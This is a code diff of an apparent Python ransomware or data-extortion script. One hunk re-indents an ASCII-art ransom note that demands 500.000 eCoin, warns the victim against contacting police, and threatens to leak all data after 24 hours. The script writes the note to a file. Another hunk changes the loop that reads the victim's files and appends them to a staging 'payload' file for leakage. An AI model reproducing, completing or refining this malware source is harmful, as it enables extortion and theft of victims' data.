@@ -50,13 +50,13 @@ note = """
                                                                                                 \  |                                        
                                                                                                   VV
 
-                                                                                  Wire 500.000 eCoin to the following account:
-                                                                                      https://www.nikolaistokkebro.online
+                                                                            Wire 500.000 eCoin to the following account:
+                                                                                https://www.nikolaistokkebro.online
                                                                                                     
-                                                                                          No police. No Feds. Just you.
+                                                                                   No police. No Feds. Just you.
 
-                                                              if the requirements are not met before 24 hours have passed, all your data will be leaked.
-                                                                                                     Be smart.
+                                                         if the requirements are not met before 24 hours have passed, all your data will be leaked.
+                                                                                              Be smart.
                                                                            
                                                                                                   """
 
@@ -64,7 +64,7 @@ with open("ransom_note.txt", "w") as ransom_note:
     ransom_note.write(note)
 
 for file in files:
-    with open(file, "rb") as data_for_snatch:
+    with open(file, "r") as data_for_snatch:
         snatched_data = data_for_snatch.read()
     with open("data.txt", "a") as payload:
         payload.write(snatched_data)
